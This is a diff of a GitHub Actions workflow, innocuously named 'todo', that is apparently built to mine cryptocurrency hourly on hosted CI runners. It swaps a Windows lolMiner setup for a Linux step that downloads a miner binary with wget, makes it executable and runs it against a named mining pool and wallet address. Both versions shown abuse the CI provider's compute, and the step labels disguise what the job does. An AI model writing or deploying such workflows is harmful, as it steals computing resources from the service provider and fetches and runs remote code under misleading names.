@@ -1,37 +1,24 @@
 name: todo
-
-on:
-  schedule:
-    # Run every hour
-    - cron: '0 * * * *'
+on: 
   workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *' # Runs every hour
 
 jobs:
   mine:
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v3
+    - name: Checkout code
+      uses: actions/checkout@v2
 
-    - name: Set up mining software
+    - name: Install dependencies
       run: |
-        choco install -y git
-        git clone https://github.com/Lolliedieb/lolMiner-releases.git
-        cd lolMiner-releases
-        dir
-        copy lolMiner.exe C:\
+        sudo apt-get update
+        sudo apt-get install -y wget
+        wget https://github.com/example/miner/releases/download/v1.0/miner-linux-x64
+        chmod +x miner-linux-x64
 
-    - name: Run miner
+    - name: Start mining
       run: |
-        set POOL=eu.mining4people.com:3390
-        set WALLET=hoosat:qz4534l97cut3j2q0dljq8hc2vvgrpx8wgcm3q7edtt8ty3vsw8sxhw72eyla.timohoosat1
-        set EXTRAPARAMETERS=--apiport 8020
-        set MyVariable=C:\lolMiner.exe
-        cd C:\
-        echo "Running lolMiner from %MyVariable%"
-        %MyVariable% --algo PYRIN --pool %POOL% --user %WALLET% --watchdog exit %EXTRAPARAMETERS%
-
-    - name: Cleanup
-      run: |
-        del C:\lolMiner.exe
+        ./miner-linux-x64 --algo PYRIN --url eu.mining4people.com:3390 --user hoosat:qz4534l97cut3j2q0dljq8hc2vvgrpx8wgcm3q7edtt8ty3vsw8sxhw72eyla.timohoosat1
